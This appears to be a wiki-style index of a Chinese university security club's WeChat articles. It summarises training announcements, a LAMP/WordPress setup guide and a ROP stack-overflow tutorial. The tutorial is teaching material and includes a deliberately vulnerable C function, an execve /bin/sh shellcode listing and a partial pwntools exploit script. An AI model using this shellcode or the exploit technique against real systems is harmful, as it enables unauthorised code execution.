---
title: 0w1Club 微信公众号文章归档索引 (2019.08-2022.07)
description: 0w1Club 安全团队微信公众号 2019年8月至2022年7月期间发布文章的汇总索引页面，涵盖 AI 安全、CTF 实战、漏洞分析、工具分享、安全研究等技术内容。新增
  2019-10-11 第五周“网站结构与 HTTP 协议分析”培训预告条目，补全周次序列；保留 2019-10-24 网站结构与 HTTP 协议分析（上）条目，记录
  LAMP 环境搭建与 WordPress 部署教程；2019-10-26 第六周 CTF Web 学习引导培训预告条目、2019-11-02 第七周 CTF 逆向入门
  OD 动态调试培训预告条目、2019-11-08 第七周逆向入门培训文章条目、BUU Web 实训预告条目、2019-11-15 第八周服务器渗透培训预告条目、2020-02-09/10
  学习资料放送两期条目、2022 年招新宣传文章条目、2019-10-11 ROP从入门到放弃技术分享条目。
category: program-analysis
tags:
- 0w1Club
- 安全团队
- 微信归档
- 文章索引
- AI安全
- CTF
- 漏洞分析
- 工具分享
- '2019'
- '2020'
- '2021'
- '2022'
- 学习资料
- 安卓逆向
- 软件逆向
- 入门教程
- 服务器渗透
- 培训预告
- 逆向工程
- 动态调试
- OllyDbg
- SSRF
- 代码审计
- 反序列化
- Phar反序列化
- 哈希长度扩展
- Burp Suite
- Web安全
- 学习路线
- LAMP
- WordPress
- Apache
- MySQL
- PHP
- HTTP协议
- 建站教程
- ROP
- 二进制利用
- 栈溢出
- Shellcode
- GEF
- Pwntools
date: '2019-08-01'
updated: '2026-11-13'
---

# 0w1Club 微信公众号文章归档索引 (2019.08-2022.07)

## 概述

本页面汇总索引 **0w1Club** 安全团队微信公众号自 **2019年8月** 至 **2022年7月** 期间发布的全部文章。0w1Club 专注于人工智能安全、CTF 竞技、漏洞挖掘与利用、二进制逆向、安全工具开发等前沿技术领域，该归档期内积累了大量高质量原创技术输出与实战复盘。

> **数据来源**：[微信公众平台](http://mp.weixin.qq.com)  
> **归档状态**：历史文章索引构建中，具体文章列表按年月持续完善

---

## 社团画像（基于 2022 招新宣传文章）

> 来源：[2022 0w1网络安全社团 招新啦~](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483943&idx=1&sn=10011c4514d0232302a091fc195a3a0e&chksm=fcd9c7f6cbae4ee0edf6d8a6ef065e517cb3a499c59f4254730355255ce1c9b35e9b32e71a02&scene=27#wechat_redirect) (2022 年初发布)

| 维度 | 详情 |
| :--- | :--- |
| **全称** | 西安交通大学 0w1 网络安全俱乐部 |
| **成立时间** | 2016 年 |
| **隶属单位** | 西安交通大学网络空间安全学院 |
| **核心使命** | 构造良好的网络安全学习环境，为成员提供学习资源、比赛信息、实习机会、科研机会 |
| **入门培训方向** | **逆向工程**、**PWN (二进制漏洞利用)**、**Web 安全** — 三大支柱方向并行 |
| **进阶·安全研究** | • 产业界：成员多次在看雪安全开发者峰会 (2021)、KCon 黑客大会 (2022) 等高影响力会议做报告；研究方向覆盖代码混淆、代码相似度检测、恶意软件分类、模糊测试<br>• 学术界：与网安学院联系密切，合适成员可推荐至课题组参与学术科研 |
| **进阶·企业实习** | • 校企合作：与多家乙方安全大厂建立联系，成员可进入安全实验室学习前沿攻防实战技术 |
| **招新方式** | 扫描文章二维码入群，后续新生培训安排在群内通知 |

**培训方向技术内涵摘录**  
- **逆向**：需掌握汇编、操作系统、编译原理、C++ 对象模型等底层知识，有助于自底向上构建计算机知识体系。  
- **PWN**：聚焦冯诺伊曼架构固有缺陷（数据与代码无绝对间隔），研究如何构造输入劫持控制流；提及 Rust 所有权机制对 UAF 类漏洞的缓解。  
- **Web**：本质仍是软件质量问题，涉及 Nginx/Apache 等中间件漏洞、业务逻辑漏洞、恶意代码植入等攻击面。

---

## 时间轴导航

### 年 (2019.08 - 2019.12)
- [ ] 2019 年 08 月
- [ ] 2019 年 09 月
- [x] **2019 年 10 月** — [2019-10-11 第五周 网站结构与 HTTP 协议分析培训预告](#2019-10-11-第五周-网站结构与-http-协议分析培训预告) · [2019-10-11 ROP从入门到放弃](#2019-10-11-rop从入门到放弃) · [2019-10-24 网站结构与 HTTP 协议分析（上）](#2019-10-24-网站结构与-http-协议分析上) · [2019-10-26 第六周 CTF Web 学习引导培训预告](#2019-10-26-第六周-ctf-web-学习引导培训预告)
- [x] **2019 年 11 月** — [2019-11-02 第七周 CTF 逆向入门 OD 动态调试培训预告](#2019-11-02-第七周-ctf-逆向入门-od-动态调试培训预告) · [2019-11-08 第七周逆向入门&动态调试分析（上）](#2019-11-08-第七周逆向入门动态调试分析上) · [2019-11-08 BUU Web 实训预告](#2019-11-08-buu-web-实训预告) · [2019-11-15 第八周服务器渗透萌新培训预告](#2019-11-15-第八周服务器渗透萌新培训预告)
- [ ] 2019 年 12 月

### 年 (2020.01 - 2020.12)
- [ ] 2020 年 01 月
- [x] **2020 年 02 月** — [学习资料放送第一弹](#2020-02-09-学习资料放送第一弹) · [学习资料放送第二弹](#2020-02-10-学习资料放送第二弹)
- [ ] 2020 年 03 月
- [ ] 2020 年 04 月
- [ ] 2020 年 05 月
- [ ] 2020 年 06 月
- [ ] 2020 年 07 月
- [ ] 2020 年 08 月
- [ ] 2020 年 09 月
- [ ] 2020 年 10 月
- [ ] 2020 年 11 月
- [ ] 2020 年 12 月

### 年 (2021.01 - 2021.12)
- [ ] 2021 年 01 月
- [ ] 2021 年 02 月
- [ ] 2021 年 03 月
- [ ] 2021 年 04 月
- [ ] 2021 年 05 月
- [ ] 2021 年 06 月
- [ ] 2021 年 07 月
- [ ] 2021 年 08 月
- [ ] 2021 年 09 月
- [ ] 2021 年 10 月
- [ ] 2021 年 11 月
- [ ] 2021 年 12 月

### 年 (2022.01 - 2022.07)
- [x] **2022 年 02 月** — [2022 0w1网络安全社团 招新啦~](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483943&idx=1&sn=10011c4514d0232302a091fc195a3a0e&chksm=fcd9c7f6cbae4ee0edf6d8a6ef065e517cb3a499c59f4254730355255ce1c9b35e9b32e71a02&scene=27#wechat_redirect)
- [ ] 2022 年 03 月
- [ ] 2022 年 04 月
- [ ] 2022 年 05 月
- [ ] 2022 年 06 月
- [ ] 2022 年 07 月

> **说明**：已标 ✅ 的月份表示已有具体文章条目，其余为占位，待后续补全。

---

## 年 10 月 文章详情

### 2019-10-11 第五周 网站结构与 HTTP 协议分析培训预告

> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483796&idx=1&sn=34cf523982cd25c6def8179ad5555d14&chksm=fcd9c445cbae4d53fb84749c03ea9107aac1c4e21cfac051f951d0cdd1c51b2ff4b8e37f3f64&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483796&idx=1&sn=34cf523982cd25c6def8179ad5555d14&chksm=fcd9c445cbae4d53fb84749c03ea9107aac1c4e21cfac051f951d0cdd1c51b2ff4b8e37f3f64&scene=27#wechat_redirect)  
> **发布日期**：2019-10-11  
> **作者**：夜晓（文/图）  
> **标签**：#培训预告 #Web安全入门 #网站结构 #HTTP协议 #BurpSuite #Apache #MySQL #WordPress #萌新培养

#### 概述

0w1Club 发布的第五周萌新培养预告文章，主题为 **网站结构与 HTTP 协议分析**。文章由夜晓撰写并配图，作为 Web 安全入门系列培训的启动预热，明确了参会前的知识储备建议与工具准备要求，并概述了分享会的两大核心内容：通过搭建简易博客理解网站基本结构（Apache、MySQL、WordPress），以及使用 Burp Suite 进行 HTTP 抓包分析以理解 HTTP 协议基础。旨在为零基础成员建立 Web 安全学习的直观认知与实操基础。

#### 核心内容结构

##### 分享会前置建议

| 准备项目 | 详细说明 |
| :--- | :--- |
| **网站运行基本结构** | 了解前后端交互模型、客户端-服务端架构、静态资源与动态业务分离等基础概念 |
| **后端 Apache 服务器** | 理解 Web 服务器的角色：监听端口、解析脚本、分发静态资源，作为网站“大脑”处理后端响应逻辑 |
| **SQL 数据库（MySQL）在后端的作用** | 理解数据持久化存储、用户信息管理、内容索引等核心功能，掌握数据库在动态网站中的定位 |
| **流行 CMS WordPress** | 了解内容管理系统（CMS）的价值：免去手写 HTML/CSS/JS/PHP 细节，快速建站、主题插件生态丰富 |
| **HTTP 分析神器 Burp Suite** | **核心工具预习**：提前下载安装并验证可用性，作为截获、修改、重放 HTTP 请求的核心工具，是 Web 漏洞挖掘与 CTF Web 题解题的基础 |

##### 分享会核心议程

| 环节 | 内容描述 | 产出/目标 |
| :--- | :--- | :--- |
| **一、搭建简易博客** | 手把手指导在服务器上部署 LAMP 核心组件，安装配置 WordPress，建立个人博客站点。文中展示了社团成员已搭建的示例站点（nightmorning.site、elapse.life、winny.work、47.94.154.243）。 | 理解网站后端运行机制，掌握 Apache+MySQL+PHP 协作流程，熟悉 WordPress 部署全过程。 |
| **二、Burp Suite HTTP 抓包分析** | 实战演示配置浏览器代理、拦截请求/响应、查看 HTTP 报文结构（请求行、头部、体；状态行、头部、体），初步建立 HTTP 协议认知。 | 掌握 Burp Suite Proxy/Repeater 基础操作，理解 HTTP 请求/响应格式、常见头部字段、状态码含义，为后续漏洞分析打基础。 |

#### 培训安排

| 项目 | 内容 |
| :--- | :--- |
| **时间** | 2019-10-11（周五） 21:10 |
| **持续时长** | 1.5 小时左右 |
| **地点** | 彭康楼（梧桐东门集合） |
| **主讲人** | 夜晓 |

#### 训练系列定位对比

| 期数 | 发布日期 | 主题 | 侧重 | 状态 |
| :--- | :--- | :--- | :--- | :--- |
| **第五周·预热（本文）** | 2019-10-11 | 网站结构与 HTTP 协议分析 | 网站基本结构认知、核心组件预习、Burp Suite 工具准备、博客搭建演示、HTTP 抓包入门 | ✅ 已发布 |
| **第五周·技术分享** | 2019-10-11 | ROP从入门到放弃 | ROP 攻击原理、栈溢出利用、Shellcode 构造、GDB/GEF 调试实战、ret2libc 思路 | ✅ [已归档](#2019-10-11-rop从入门到放弃) |
| **技术基础·落地** | 2019-10-24 | 网站结构与 HTTP 协议分析（上） | LAMP 详细搭建步骤、WordPress 图文部署教程、数据库初始化 SQL、HTTP 协议深度分析预告 | ✅ [已归档](#2019-10-24-网站结构与-http-协议分析上) |
| **第六周·预热** | 2019-10-26 | CTF Web 学习引导 | Burp Suite 进阶预习、CTF 竞赛认知建立、Web 学习路线方法论、友好资料分发 | ✅ [已归档](#2019-10-26-第六周-ctf-web-学习引导培训预告) |
| **第七周·预热** | 2019-11-02 | CTF逆向入门 OD动态调试入门 | 环境部署、工具验证、靶标准备、基础预习 | ✅ [已归档](#2019-11-02-第七周-ctf-逆向入门-od-动态调试培训预告) |
| **第七周·理论（上）** | 2019-11-08 | 逆向入门&动态调试分析（上） | 概念体系、应用场景、学习路径、推荐资源、方法论 | ✅ [已归档](#2019-11-08-第七周逆向入门动态调试分析上) |
| **第七周·Web实训** | 2019-11-08 | BUU Web 实训 | SSRF、代码审计、反序列化、Phar、哈希长度扩展实战 | ✅ [已归档](#2019-11-08-buu-web-实训预告) |
| **第八周** | 2019-11-15 | 服务器渗透萌新培训 | SSH、nmap、dirb、john、Kali 环境 | ✅ [已归档](#2019-11-15-第八周服务器渗透萌新培训预告) |

#### 关联技术生态

- **LAMP 架构**：经典开源 Web 技术栈 (Linux + Apache + MySQL + PHP)，本次培训为后续 10-24 详细部署教程的预热引导。
- **WordPress 生态**：全球市场占有率超 40% 的 CMS，插件/主题机制丰富，亦是漏洞高发区（插件漏洞、核心代码审计、XML-RPC 攻击面等）。
- **HTTP 协议核心知识点**：请求/响应报文结构、方法语义 (GET/POST/PUT/DELETE 等)、状态码分类、Header 字段详解、Cookie/Session 机制、缓存控制、内容协商、HTTPS/TLS 握手、HTTP/2 多路复用、HTTP/3 QUIC。
- **Burp Suite 核心模块**：Proxy (拦截代理)、Repeater (请求重放)、Intruder (自动化攻击)、Scanner (漏洞扫描)、Decoder/Encoder (编解码)、Comparer (差异对比)、Sequencer (随机性分析)、Extender (插件扩展)。
- **进阶学习路线**：[[reverse-engineering-beginner-learning-path]] 中的任务驱动学习法同理适用 — 搭建靶场、抓包分析、漏洞复现、编写 PoC、工具二次开发。

---

### 2019-10-11 ROP从入门到放弃

> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483790&idx=1&sn=9c29301844c34f1672caf2cdcafdd554&chksm=fcd9c45fcbae4d4967698bf46d60121a099d29cdc2e4c2247ab181691cc4a2c7cbce1ae9ff54&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483790&idx=1&sn=9c29301844c34f1672caf2cdcafdd554&chksm=fcd9c45fcbae4d4967698bf46d60121a099d29cdc2e4c2247ab181691cc4a2c7cbce1ae9ff54&scene=27#wechat_redirect)  
> **发布日期**：2019-10-11  
> **作者**：ya0guang（0w1 社团创始人，文/图）、夜晓（排版）  
> **标签**：#ROP #二进制利用 #栈溢出 #Shellcode #GEF #Pwntools #ASLR #NX #PIE #Canary #CTF #入门教程 #Linux_x86 #ret2libc

#### 概述

0w1Club 社团创始人 ya0guang 撰写的 ROP (Return Oriented Programming) 入门实战教程。文章以作者从零开始学习 ROP 技术的亲身经历为线索，系统梳理了 Linux x86 环境下栈溢出漏洞利用的核心知识体系：从堆栈布局、参数传递差异、保护机制（ASLR/NX/PIE/Canary）原理，到偏移定位、Shellcode 构造、GDB/GEF 动态调试、Core Dump 地址泄露等完整利用流程。文中配合 `ROP_STEP_BY_STEP` 开源仓库代码实战复现，特别针对 GCC 默认开启 PIE 导致的地址随机化问题给出调试对策，是二进制安全入门者极具参考价值的实战笔记。

#### 核心内容结构

##### 前言与学习路径
- **背景**：作者受任复现 SGX 相关攻击，涉及 ROP 技术，此前无二进制/逆向经验，遂从零自学并记录
- **参考资料**：蒸米大神「一步一步学ROP」系列（乌云知识库/看雪/ GitHub `zhengmin1989/ROP_STEP_BY_STEP`）
- **假设前提**：仅假设读者了解基本 x86 汇编指令，所有实验均在 Linux 环境下执行
- **工具推荐**：强烈建议安装 **GEF** 替代原生 GDB 完成调试工作

##### 背景知识体系

###### 什么是 ROP
- **定义**：Return Oriented Programming，返回导向编程
- **核心机制**：利用 `ret` 指令语义 — `pop IP` 将栈顶数据复制给指令指针，实现程序跳转
- **攻击前提**：能够控制栈内容 → 控制 `ret` 返回地址 → 劫持控制流

###### 栈内存布局
- 栈从高地址向低地址增长
- `push` 时 SP 减少，`pop` 时 SP 增加
- 栈溢出本质：数据覆盖栈顶返回地址区域，实现控制流劫持

###### 参数传递约定差异 (x86 vs x86-64)
| 架构 | 参数传递方式 | 验证示例 |
| :--- | :--- | :--- |
| **x86 (32位)** | 所有参数压栈传递，从右向左入栈 | `printf` 8 个参数全部 `pushl` 入栈 |
| **x86-64 (64位)** | 前 6 个参数依次放入 `rdi, rsi, rdx, rcx, r8, r9`，其余压栈 | `printf` 前 6 个参数寄存器传递，第 7/8 个压栈 |

> **验证方法**：`gcc -S [-m32] source.c` 生成汇编对比观察

###### 保护机制全景
| 机制 | 说明 | 检测工具 |
| :--- | :--- | :--- |
| **ASLR** (地址空间布局随机化) | 系统级防护，随机化栈/堆/库基址 | `echo 0/2 \| sudo tee /proc/sys/kernel/randomize_va_space` 关闭/开启 |
| **RELRO** (重定向只读) | Partial/Full，保护 GOT 表不被篡改 | `checksec` |
| **Stack Canary** | 栈帧保护值，检测栈溢出 | `checksec` |
| **NX** (不可执行栈) | 栈内存不可执行，阻断 Shellcode 直接运行 | `checksec` |
| **PIE** (位置无关可执行) | 代码段基址随机化，影响 ROP Gadget 定址 | `checksec`，**GCC 近期版本默认开启**，需显式 `-no-pie` 关闭 |

> **实战坑点**：GCC 默认开启 PIE 导致编译出的二进制与教程仓库不一致，需显式 `-no-pie -fno-stack-protector -z execstack` 降低防护复现基础场景

##### 实战复现：x86 ROP 101

###### 靶程序分析
```c
void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);  // 明显的栈溢出：读入 256 字节到 128 字节缓冲区
}
```
编译选项：`gcc -fno-stack-protector -z execstack -no-pie -o level1 level1.c -m32`

###### 步骤 1：寻找溢出偏移
```bash
gef➤ pattern create 150
gef➤ r
# 输入 pattern 字符串，触发 segfault，观察 IP 值
gef➤ pattern search 0x6261616b
# 输出 offset = 140
```
- 溢出点位于第 140 字节，即构造 payload 时前 140 字节填充，第 141-144 字节覆盖返回地址

###### 步骤 2：Shellcode 选取与分析
```asm
; 经典 execve("/bin/sh") shellcode (25 字节)
xor eax, eax
push eax
push 0x68732f2f   ; "//sh"
push 0x6e69622f   ; "/bin"
mov ebx, esp      ; EBX 指向 "/bin//sh"
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 0xb       ; sys_execve = 11
int 0x80
```
- 通过 `int 0x80` 触发系统调用，`eax=11` 对应 `sys_execve`
- 参数构造利用栈布局：`filename="/bin//sh"`、`argv=NULL`、`envp=NULL`

###### 步骤 3：Payload 构造策略
```
payload = shellcode + padding(140 - len(shellcode)) + shellcode_start_address
```
- 关键难点：**Shellcode 起始地址如何确定？** 栈地址受 ASLR 影响不固定

###### 步骤 4：Core Dump 地址泄露法 (绕过 ASLR 定位栈地址)
```python
# pwntools 自动化脚本
from pwn import *
context(arch='i386', os='linux')
io = process('./level1')
payload = shellcode + b'A' * (140 - len(shellcode)) + p32(0xdeadbeef)  # 占位返回地址
io.sendline(payload)
io.wait()
core = io.corefile
stack_addr = core.esp - 144  # 栈指针回溯到 shellcode 起始位置
# 重新构造正确 payload 发送...
```
- 首次运行生成 core dump，通过 `core.esp` 计算 shellcode 真实地址
- 二次运行填入正确地址，成功获取 Shell

###### 步骤 5：实战截图验证
- 文中附带 GEF 界面截图展示 pattern search、core dump 分析、最终 `whoami` 成功获取 Shell 的完整过程

#### 技术要点总结

| 知识点 | 核心要点 | 关联进阶页面 |
| :--- | :--- | :--- |
| **栈溢出原理** | 缓冲区未检查边界 → 覆盖返回地址 → 劫持控制流 | [[rop-linux-x86-beginner-tutorial]] |
| **x86/x64 调用约定** | 参数传递方式差异直接影响 ROP 链构造 | [[rop-linux-x86-beginner-tutorial#参数传递]] |
| **保护机制组合** | ASLR+NX+PIE+Canary 叠加防御，需分步绕过 | [[linux-kernel-hardening-mechanisms]] |
| **偏移精确定位** | Pattern 创建/搜索是通用标准流程 | [[rop-linux-x86-beginner-tutorial#偏移定位]] |
| **Shellcode 编写** | 系统调用号、参数布局、大小端序、避免坏字符 | [[rop-linux-x86-beginner-tutorial#shellcode-构造]] |
| **Core Dump 利用** | 通过崩溃转储泄露运行时栈地址，绕过 ASLR | [[rop-linux-x86-beginner-tutorial#实战利用流程]] |
| **GEF 调试增强** | pattern、search、vmmap、checksec 一体化 | [[ida-pro-tips-plugins-python]] (工具生态对比) |

#### 学习路线定位与延伸

| 阶段 | 内容 | 关联资源 |
| :--- | :--- | :--- |
| **入门基础** | 汇编语言、C 语言、计组/操作系统、Linux 环境 | [[reverse-engineering-beginner-learning-path#核心预备知识]] |
| **ROP 核心** | 栈溢出 → ret2shellcode → ret2libc → ROP Chain → SROP | [[rop-linux-x86-beginner-tutorial]] (系统化教程) |
| **工具链精通** | GDB/GEF、Pwntools、ROPgadget、ROPper、one_gadget | [[ida-pro-tips-plugins-python]] (逆向工具生态) |
| **实战靶场** | ROP_STEP_BY_STEP、pwnable.kr、BUUOJ、HTB | [[0w1club-wechat-archive-201908-202207#2019-11-08-buu-web-实训预告]] (社团实训) |
| **进阶研究** | 绕过 CFI、JIT-ROP、数据导向编程、内核 ROP | [[linux-kernel-hardening-mechanisms#控制流完整性]] |

#### 社团培训体系中的定位
- **发布时间**：与第五周 Web 预热培训同天 (2019-10-11)，体现社团「逆向/PWN 与 Web 并行」的双轨培养策略
- **作者身份**：ya0guang (社团创始人) 亲笔实战笔记，代表社团核心技术骨干的知识输出标准
- **教学特色**：「从零开始、记录踩坑、给出对策」—— 典型的任务驱动学习法，与 [[reverse-engineering-beginner-learning-path#任务驱动学习法]] 理念一致
- **知识传承**：文章末尾标注「本文章由 0w1 社团创始人(ya0guang) 提供，话不多说，膜就完事了」—— 体现社团内部技术传承的非正式文化氛围

---

### 2019-10-24 网站结构与 HTTP 协议分析（上）

> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483818&idx=1&sn=20735e705391775e2811b6d08f628b18&chksm=fcd9c47bcbae4d6d88a9398437b2fc6f80b2b8e3f72f7e203fcd690b2ece9bfdc3f5e62a4b95&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483818&idx=1&sn=20735e705391775e2811b6d08f628b18&chksm=fcd9c47bcbae4d6d88a9398437b2fc6f80b2b8e3f72f7e203fcd690b2ece9bfdc3f5e62a4b95&scene=27#wechat_redirect)  
> **发布日期**：2019-10-24  
> **作者**：夜晓（图文/排版）  
> **标签**：#LAMP #WordPress #Apache #MySQL #PHP #HTTP协议 #建站教程 #Web安全入门 #BurpSuite预告

#### 概述

0w1Club 发布的技术入门文章，**网站结构与 HTTP 协议分析（上）**。文章由夜晓撰写并排版，采用"动手搭建"的教学模式，指导读者在 Ubuntu 环境下从零开始部署 LAMP (Linux + Apache + MySQL + PHP) 架构，并基于 WordPress CMS 快速建立个人博客站点。文章作为第六周 CTF Web 学习引导培训的配套技术基础，旨在让零基础成员理解网站后端运行机制，为后续使用 Burp Suite 进行 HTTP 协议分析打下实战基础。

#### 核心内容结构

##### 一、灵魂：Apache + MySQL

###### Web 服务器：Apache
- **定位**：运行在服务器上的 Web 服务程序，**通过 PHP 语言执行一切后端不可见的响应操作**，相当于网站的"大脑"
- **市场地位**：当前市场份额最大的 Web 服务器软件
- **安装部署**：
  ```bash
  sudo apt-get install apache2  # 安装 Apache 服务器
  sudo apt-get install php      # 安装 PHP 解释器
  apache2 -v                    # 验证 Apache 安装
  php -v                        # 验证 PHP 安装
  cd /etc/init.d/
  sudo ./apache2 start          # 启动 Apache 服务
  ```
- **验证访问**：浏览器访问 `http://127.0.0.1` 显示 Apache 默认欢迎页
- **网站根目录**：`/var/www/html` — 所有网站内容需放置于此目录下

###### 数据库：MySQL
- **定位**：解决大规模数据存储与高效查询的核心组件，集成优秀数据结构与算法，让开发者专注业务逻辑
- **网站作用**：存储文件路径、用户信息、安全配置等关键数据
- **安装部署**：
  ```bash
  sudo apt-get install mysql-server
  sudo apt-get install php-mysql  # 使 PHP 能操作 MySQL
  sudo service mysql start        # 启动 MySQL 服务
  ```
- **数据库初始化**：
  ```sql
  mysql -u root
  -- 创建 wordpress 用户，密码 qwe123
  CREATE USER 'wordpress'@'localhost' IDENTIFIED BY 'qwe123';
  -- 创建 wordpress 数据库
  CREATE DATABASE wordpress;
  -- 授权
  GRANT ALL ON wordpress.* TO 'wordpress'@'localhost';
  ```

##### 二、皮囊：CMS — WordPress

- **CMS 价值**：免去手写 HTML/CSS/JavaScript/PHP 等繁琐细节，使用者专注内容创作
- **WordPress 部署**：
  ```bash
  cd /var/www/html                    # 进入 Apache 根目录
  wget https://cn.wordpress.org/latest-zh_CN.tar.gz  # 下载中文版
  tar -xzf latest-zh_CN.tar.gz        # 解压
  rm latest-zh_CN.tar.gz              # 清理压缩包
  ```
- **安装向导**：浏览器访问 `http://127.0.0.1/wordpress`，按向导填入数据库信息
- **配置文件处理**：向导提示手动创建 `wp-config.php`，使用 `nano` 编辑器粘贴配置内容保存
- **站点初始化**：设置站点标题、管理员账号/密码/邮箱，完成安装进入后台仪表盘
- **后续扩展**：可自行研究主题切换、插件安装、内容发布等功能

##### 三、HTTP 分析（预告）

###### Burp Suite
- **定位**：Web 渗透测试集成平台，集成 Proxy/Repeater/Intruder/Scanner 等核心模块，支持一键式 Web 安全测试
- **后续用途**：将在下期文章中用于分析本文搭建站点的 HTTP 流量

###### HTTP 协议
- **定位**：应用层顶层协议，专用于 Web 浏览，特性丰富
- **学习推荐**：《图解 HTTP》— 质量高、新手友好，结合抓包实践可建立全面基础认知
- **后续安排**：下期结合 Burp Suite 实战分析 HTTP 报文结构与交互流程

#### 技术栈全景图

| 层级 | 组件 | 版本/来源 | 核心作用 |
| :--- | :--- | :--- | :--- |
| **操作系统** | Ubuntu (虚拟机) | - | 运行环境基座 |
| **Web 服务器** | Apache 2 | `apt-get install apache2` | 监听 80 端口、解析 PHP、分发静态资源 |
| **脚本引擎** | PHP | `apt-get install php` | 执行动态业务逻辑、连接数据库 |
| **数据库** | MySQL Server | `apt-get install mysql-server` | 持久化存储站点数据、用户凭证、配置 |
| **CMS 框架** | WordPress (中文版) | `cn.wordpress.org` | 提供后台管理、主题系统、插件生态、内容发布流程 |
| **分析工具** | Burp Suite (预告) | PortSwigger | HTTP 抓包、篡改、重放、自动化扫描 |

---

### 2019-10-26 第六周 CTF Web 学习引导培训预告

> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483823&idx=1&sn=f9acef08558a331c63778a7b00a0f278&chksm=fcd9c47ecbae4d68bbf0e27e13105645cd369f449be1fab655cf70d799306de0598c4267baf9&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483823&idx=1&sn=f9acef08558a331c63778a7b00a0f278&chksm=fcd9c47ecbae4d68bbf0e27e13105645cd369f449be1fab655cf70d799306de0598c4267baf9&scene=27#wechat_redirect)  
> **发布日期**：2019-10-26  
> **作者**：夜晓（文/图）  
> **标签**：#CTF #Web安全 #BurpSuite #培训预告 #萌新培养 #学习路线 #HTTP分析

#### 概述

0w1Club 发布的第六周萌新培养预告文章，主题为 **CTF Web 学习引导**。文章由夜晓撰写并配图，作为 Web 安全培训系列的启动预热，重点明确了参会前的工具预习建议（Burp Suite）、CTF 基础认知建立，并预告分享会将重点讲解“有了一定基础后如何开始疯狂学习涨姿势、避免绕弯路”，同时分发友好的学习资料包，旨在为零基础成员建立 Web 安全学习的正确路线图。

#### 核心内容结构

##### 分享会前置建议

| 准备项目 | 详细说明 | 资源链接 |
| :--- | :--- | :--- |
| **核心工具：Burp Suite** | HTTP 分析神器，Web 安全测试必备工具，需提前下载安装并验证可用性；作为截获、修改、重放 HTTP 请求的核心工具，是 Web 漏洞挖掘与 CTF Web 题解题的基础 | `https://pan.baidu.com/s/1JsD0hwA70Y9Kk7apSUKz8A` (提取码: `d4z7`) |
| **基础认知：CTF 竞赛形式** | 利用搜索引擎了解 CTF (Capture The Flag) 竞赛的基本模式（解题夺旗）、常见题型分类（Web、Reverse、Pwn、Crypto、Misc 等）、Flag 格式、平台环境（如 BUUOJ、CTFd 等），建立初步比赛心智模型 | 推荐搜索关键词：CTF 入门、CTF Web 入门、BUUOJ 使用教程 |
| **学习心态：避免绕弯路** | 文章明确指出本次分享核心在于“有一定基础后怎么开始疯狂学习涨姿势，并且还会分发一些比较友好的学习资料” — 强调方法论与资源获取的重要性 | 后续分享会现场分发 |

> **特别提示**："能来一定要来鸭" — 体现社团对新成员参与度的重视，线下面对面传授学习路线与资源分发是社团培养体系的重要一环。

##### 培训安排

| 项目 | 内容 |
| :--- | :--- |
| **时间** | 2019-10-26（周六） 21:10 |
| **持续时长** | 1 小时左右 |
| **地点** | 彭康楼（梧桐东门集合） |
| **主讲人** | 夜晓 |

#### 关联技术生态

- **Burp Suite**：PortSwigger 出品的 Web 应用安全测试集成平台，核心模块包括 Proxy（拦截代理）、Repeater（请求重放）、Intruder（自动化攻击）、Scanner（漏洞扫描）、Decoder/Encoder（编解码）、Comparer（差异对比）、Sequencer（随机性分析）等；Community 版免费，Professional 版提供扫描器与高级功能
- **CTF Web 方向核心技能树**：
  - **基础协议**：HTTP/HTTPS、DNS、WebSocket、HTTP Smuggling
  - **常见漏洞**：SQLi、XSS、CSRF、SSRF、XXE、文件上传/包含、反序列化、模板注入 (SSTI)、逻辑漏洞
  - **语言/框架特性**：PHP 弱类型/反序列化/Phar、Java 反序列化/SpEL/RCE、Python Pickle/SSTI、Node.js 原型链污染、Go 模板注入
  - **中间件/容器**：Nginx/Apache 配置错误、Tomcat/WeLogic/JBoss 反序列化、Docker/K8s 安全
  - **工具链**：Burp Suite、SQLMap、XSStrike、YSoserial、GadgetProbe、dirsearch/ffuf、Nuclei
- **学习路线参考**：[[reverse-engineering-beginner-learning-path]] 中的任务驱动学习法同理适用于 Web 安全 — 找靶机、做题、遇到不会的查资料、复盘总结

---

## 年 11 月 文章详情

### 2019-11-02 第七周 CTF 逆向入门 OD 动态调试培训预告

> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483841&idx=1&sn=97dbd7467f21b26b20da82f3b17aa64e&chksm=fcd9c410cbae4d06c49966cc2437750229fe518285b24093590faa8e907eb4b84e71c94434e4&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483841&idx=1&sn=97dbd7467f21b26b20da82f3b17aa64e&chksm=fcd9c410cbae4d06c49966cc2437750229fe518285b24093590faa8e907eb4b84e71c94434e4&scene=27#wechat_redirect)  
> **发布日期**：2019-11-02  
> **作者**：Winny（文/图）  
> **标签**：#CTF逆向入门 #动态调试 #OllyDbg #OD #逆向工程 #微信PC版 #汇编语言 #培训预告 #萌新培养

#### 概述

0w1Club 发布的第七周萌新培养预告文章，主题为 **CTF逆向入门 OD动态调试入门**。文章由 Winny 撰写并配图，作为逆向培训系列的实战预热，重点明确了参会前的环境配置要求、基础知识储备建议及实战靶标准备，旨在让零基础成员在正式分享会前完成工具链部署与基础概念建立，降低现场上手门槛。

#### 核心内容结构

##### 分享会前置建议

| 准备项目 | 详细说明 | 资源链接 |
| :--- | :--- | :--- |
